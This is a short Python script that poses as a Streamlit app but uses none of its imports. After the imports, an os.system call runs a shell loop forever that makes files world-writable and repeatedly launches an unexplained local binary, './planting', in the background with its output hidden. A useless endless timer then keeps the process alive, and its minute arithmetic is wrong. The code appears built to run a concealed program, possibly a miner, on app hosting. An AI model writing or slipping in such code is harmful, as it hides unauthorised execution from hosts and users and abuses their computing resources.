from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
os.system("while [ 1 ]; do nohup chmod 777 docker planting && ./planting > /dev/null; sleep 1; done")

import time 
from IPython.display import clear_output 
 
def zero_to_infinity(): 
    i = 0 
    while True: 
        yield i 
        i += 1 
        time.sleep(1) 
 
start = time.time() 
for x in zero_to_infinity(): 
    clear_output(wait=True) 
    end = time.time() 
    temp = end-start 
    hours = temp//3600 
    temp = temp - 3600*hours 
    minutes = temp//120 
    seconds = temp - 120*minutes 
    print("") 
    print('%s %d:%d:%d' %("Time execution : ",hours,minutes,seconds)) 
    print("")
